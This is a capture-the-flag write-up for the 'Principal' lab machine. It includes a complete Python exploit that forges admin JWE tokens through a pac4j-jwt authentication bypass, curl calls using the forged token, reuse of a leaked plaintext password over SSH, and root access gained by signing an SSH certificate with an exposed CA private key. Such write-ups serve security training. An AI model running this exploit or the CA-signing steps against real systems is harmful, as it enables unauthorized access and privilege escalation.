# Room: Principal

Difficulty: Medium

## Reconnaissance

First thing when doing pentesting was to scan for open ports using:
``` bash
nmap -sC -sV TARGET_IP -T4
```
- -sC = default scripts
- -sV = version detection
- -T4 = fast/aggressive scan

Result:
``` bash
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b0:a0:ca:46:bc:c2:cd:7e:10:05:05:2a:b8:c9:48:91 (ECDSA)
|_  256 e8:a4:9d:bf:c1:b6:2a:37:93:40:d0:78:00:f5:5f:d9 (ED25519)
8080/tcp open  http-proxy Jetty
|_http-server-header: Jetty
|_http-open-proxy: Proxy might be redirecting requests
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Tue, 31 Mar 2026 05:17:36 GMT
|     Server: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
```
## Web Enumeration

Visiting port 8080 showed a login panel. I began enumerating hidden directories using:
``` bash
dashboard               [Status: 200]
error                   [Status: 500]
login                   [Status: 200]
meta-inf                [Status: 500]
META-INF                [Status: 500]
WEB-INF                 [Status: 500]
web-inf                 [Status: 500]
```
There was nothing valuable from the directory brute force, so I inspected the page source and found a JavaScript endpoint.
``` 
 /static/js/app.js
```
## Initial Findings

Upon reading the JavaScript file, I found:

### “Public key available at /api/auth/jwks for token verification”

Visiting that endpoint revealed several API routes:

``` javascript
const API_BASE = '';
const JWKS_ENDPOINT = '/api/auth/jwks';
const AUTH_ENDPOINT = '/api/auth/login';
const DASHBOARD_ENDPOINT = '/api/dashboard';
const USERS_ENDPOINT = '/api/users';
const SETTINGS_ENDPOINT = '/api/settings';
```

## Vulnerability Research

I searched for vulnerabilities related to pac4j-jwt and discovered an authentication bypass vulnerability:

### CVE-2026-29000

This vulnerability allows attackers to bypass authentication under certain conditions related to JWT/JWE handling and misconfigurations in the authentication framework.

For more information: 
- https://nvd.nist.gov/vuln/detail/CVE-2026-29000
- https://www.codeant.ai/security-research/pac4j-jwt-authentication-bypass-public-key

exploit.py
``` python
#!/usr/bin/env python3

import json
import base64
import time
import argparse
import requests
from jwcrypto import jwk, jwe


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def create_plain_jwt(username, role):
    """Create unsigned PlainJWT"""
    header = {"alg": "none", "typ": "JWT"}

    now = int(time.time())

    claims = {
        "sub": username,
        "role": role,
        "iss": "principal-platform",
        "iat": now,
        "exp": now + 3600
    }

    header_b64 = b64url(json.dumps(header).encode())
    payload_b64 = b64url(json.dumps(claims).encode())

    # NOTE: no signature part
    return f"{header_b64}.{payload_b64}."


def fetch_jwks(jwks_url):
    """Fetch JWKS and return keys"""
    try:
        res = requests.get(jwks_url, timeout=10)
        res.raise_for_status()
        data = res.json()

        if "keys" not in data:
            raise ValueError("Invalid JWKS response: no 'keys' field")

        return data["keys"]

    except Exception as e:
        print(f"[!] Failed to fetch JWKS: {e}")
        exit(1)


def select_key(keys, kid=None):
    """Select a key from JWKS"""
    if kid:
        for key in keys:
            if key.get("kid") == kid:
                return key
        print("[!] Specified kid not found, using first key instead")

    return keys[0]


def build_jwe(plain_jwt, jwks_key):
    """Encrypt PlainJWT into JWE"""

    try:
        public_key = jwk.JWK.from_json(json.dumps(jwks_key))
    except Exception as e:
        print(f"[!] Failed to load public key: {e}")
        exit(1)

    protected_header = {
        "alg": "RSA-OAEP-256",
        "enc": "A128GCM",
        "cty": "JWT",
        "kid": jwks_key.get("kid", "")
    }

    token = jwe.JWE(
        plain_jwt.encode(),
        protected=json.dumps(protected_header)
    )

    token.add_recipient(public_key)

    return token.serialize(compact=True)


def main():
    parser = argparse.ArgumentParser(description="JWT/JWE Token Generator (CTF PoC)")

    parser.add_argument("--jwks", required=True, help="JWKS endpoint URL")
    parser.add_argument("--kid", help="Specific key ID (optional)")
    parser.add_argument("--user", default="admin", help="Username (sub claim)")
    parser.add_argument("--role", default="ROLE_ADMIN", help="Role claim")

    args = parser.parse_args()

    print("[*] Fetching JWKS...")
    keys = fetch_jwks(args.jwks)

    print(f"[+] Found {len(keys)} key(s)")

    jwks_key = select_key(keys, args.kid)

    print(f"[+] Using key: {jwks_key.get('kid', 'no-kid')}")

    print("[*] Creating PlainJWT...")
    plain_jwt = create_plain_jwt(args.user, args.role)

    print("[+] PlainJWT created")

    print("[*] Encrypting into JWE...")
    malicious_token = build_jwe(plain_jwt, jwks_key)

    print("\n=== Malicious JWE Token ===\n")
    print(malicious_token)

    print("\n=== Usage ===")
    print(f"Authorization: Bearer {malicious_token}")


if __name__ == "__main__":
    main()
```
Usage:
``` bash
 python3 exploit.py --jwks http://TARGET_IP:8080/api/auth/jwks --user admin --role ROLE_ADMIN
```
Response:
``` bash
[*] Fetching JWKS...
[+] Found 1 key(s)
[+] Using key: enc-key-1
[*] Creating PlainJWT...
[+] PlainJWT created
[*] Encrypting into JWE...

=== Malicious JWE Token ===

eyJhbGciOiAiUlNBLU9BRVAtMjU2IiwgImVuYyI6ICJBMTI4R0NNIiwgImN0eSI6ICJKV1QiLCAia2lkIjogImVuYy1rZXktMSJ9.k8nB5thu7M66XvyTSOTDT0H42fndz9kPlr_VOZcX8J5Z4Wh4roawyL0S6Sevce6ar8-r0mlNN56vlpg_Y7jgAw1e5diI-cZwzUxLZCeju_1ntK6RZxI-n0PENqF7qIRHK2A54KKHx4gQg3aydaxGTTphecGhDCvqbONDCp5Wu3okrZX4xkQDggQ33zGTAAqzayEeFgUEqFBD7BHmOs13o-1KlNOb0SDUDZhe0-zus0tv_Ik0spzmZ_YvUl1UkKBIBsxLbyJBlpJfWB8510dEOgGOlnNWpYsTiT2jzFhFhQsW1-FJhieLBcy3ieCThcHYOOAqbK_l8_iItpArBIp34g.UC-auIvFNGfncDhF.0jYhTUdqhxGUcMGE8y4N3vJsoTa9ncJ41lUEhLXz9R4EB_hoffDom4pc4jQLKp8AtGkNVv8HmQDCpf0V_881vrMQY1XJ-cTD2oEOSgmjFJkytAA5hOTDRlIVs81_iZLdI15-PzYNNvytKFpBrWpGxfY-GxNp759c9JMirQVj9nFPJgiRB3bs3BfvW0XUmImvFDvu_mm8RdOJmt0mLJIVMP7vyfNJ92Ihb7xo_UoR68AJ-Klm4w.QpFof8gpCM1ow4FbRuaK9Q

=== Usage ===
Authorization: Bearer eyJhbGciOiAiUlNBLU9BRVAtMjU2IiwgImVuYyI6ICJBMTI4R0NNIiwgImN0eSI6ICJKV1QiLCAia2lkIjogImVuYy1rZXktMSJ9.k8nB5thu7M66XvyTSOTDT0H42fndz9kPlr_VOZcX8J5Z4Wh4roawyL0S6Sevce6ar8-r0mlNN56vlpg_Y7jgAw1e5diI-cZwzUxLZCeju_1ntK6RZxI-n0PENqF7qIRHK2A54KKHx4gQg3aydaxGTTphecGhDCvqbONDCp5Wu3okrZX4xkQDggQ33zGTAAqzayEeFgUEqFBD7BHmOs13o-1KlNOb0SDUDZhe0-zus0tv_Ik0spzmZ_YvUl1UkKBIBsxLbyJBlpJfWB8510dEOgGOlnNWpYsTiT2jzFhFhQsW1-FJhieLBcy3ieCThcHYOOAqbK_l8_iItpArBIp34g.UC-auIvFNGfncDhF.0jYhTUdqhxGUcMGE8y4N3vJsoTa9ncJ41lUEhLXz9R4EB_hoffDom4pc4jQLKp8AtGkNVv8HmQDCpf0V_881vrMQY1XJ-cTD2oEOSgmjFJkytAA5hOTDRlIVs81_iZLdI15-PzYNNvytKFpBrWpGxfY-GxNp759c9JMirQVj9nFPJgiRB3bs3BfvW0XUmImvFDvu_mm8RdOJmt0mLJIVMP7vyfNJ92Ihb7xo_UoR68AJ-Klm4w.QpFof8gpCM1ow4FbRuaK9Q
```

Since we have the token, I can view the endpoints

1st attempt (/api/users):
``` bash
curl -H "Authorization: Bearer <TOKEN> http://TARGET_IP:8080/api/users"
```
Response:
``` 
admin
svc-deploy
jthompson
amorales
bwright
kkumar
mwilson
lzhang
```

2nd attempt (/api/settings)
``` bash
curl -H "Authorization: Bearer <TOKEN> http://TARGET_IP:8080/api/settings"
```
Response:

``` json
{
  "infrastructure": {
    "database": "H2 (embedded)",
    "sshCertAuth": "enabled",
    "sshCaPath": "/opt/principal/ssh/",
    "notes": "SSH certificate auth configured for automation - see /opt/principal/ssh/ for CA config."
  },
  "system": {
    "version": "1.2.0",
    "applicationName": "Principal Internal Platform",
    "javaVersion": "21.0.10",
    "serverType": "Jetty 12.x (Embedded)",
    "environment": "production"
  },
  "security": {
    "authFramework": "pac4j-jwt",
    "authFrameworkVersion": "6.0.3",
    "jwtAlgorithm": "RS256",
    "jweAlgorithm": "RSA-OAEP-256",
    "jweEncryption": "A128GCM",
    "encryptionKey": "D3pl0y_$$H_Now42!",
    "tokenExpiry": "3600s",
    "sessionManagement": "stateless"
  },
  "integrations": [
    {
      "name": "GitLab CI/CD",
      "status": "connected",
      "lastSync": "2025-12-28T12:00:00Z"
    },D3pl0y_$$H_Now42!
    {
      "name": "Vault",
      "status": "connected",
      "lastSync": "2025-12-28T14:00:00Z"
    },
    {
      "name": "Prometheus",
      "status": "connected",
      "lastSync": "2025-12-28T14:30:00Z"
    }
  ]
}
```
There's a lot of useful information here.

I logged in as 
``` bash
svc-deploy:D3pl0y_$$H_Now42!
```
on ssh and it works!

I grabbed the user.txt at /home/svc-deploy/user.txt

## Priviledge Escalation (SSH CA Abuse)

During filesystem enumeration, I found the following files:
``` bash
/opt/principal/ssh/ca
/opt/principal/ssh/ca.pub
```
- ca → SSH CA private key
- ca.pub → SSH CA public key

I verified that I had read access to these files, which indicates a misconfiguration in file permissions.

## SSH Configuration Analysis
I inspected the SSH daemon configuration:
``` bash
cat /etc/ssh/sshd_config.d/*.conf
```
I found the following important line:
``` bash
TrustedUserCAKeys /opt/principal/ssh/ca.pub
```
This confirms that the SSH server trusts any user certificate signed by the CA public key.

## Vulnerability

The presence of the CA private key combined with the TrustedUserCAKeys configuration leads to:

- The attacker can sign arbitrary SSH public keys
- The SSH server will trust any certificate signed by this CA
- This allows impersonation of any valid principal (user)

## Exploitation Steps
1. Generate SSH key pair

``` bash
ssh-keygen -t rsa -f mykey
```
This generates:

- mykey (private key)
- mykey.pub (public key)

2. Fix CA private key permissions
``` bash
chmod 600 ca
```
SSH requires private keys to be properly protected.

3. Sign the public key using the CA
``` bash
ssh-keygen -s ca -I ctf -n root mykey.pub
```
This produces:

- mykey-cert.pub (signed certificate)

Parameters:

- -I ctf → certificate identity
- -n root → principal (target username)

4. Authenticate using the signed certificate
``` bash
ssh -i mykey -o CertificateFile=mykey-cert.pub root@target_ip
```

SSH accepts the certificate because:

- It is signed by a trusted CA
- The principal matches a valid user
- The CA is listed in TrustedUserCAKeys

## Result:
Successful authentication as the specified user (e.g., root) without needing a password or existing credentials.

I grabbed the flag at /root/root.txt
``` bash
cat /root/root.txt
```
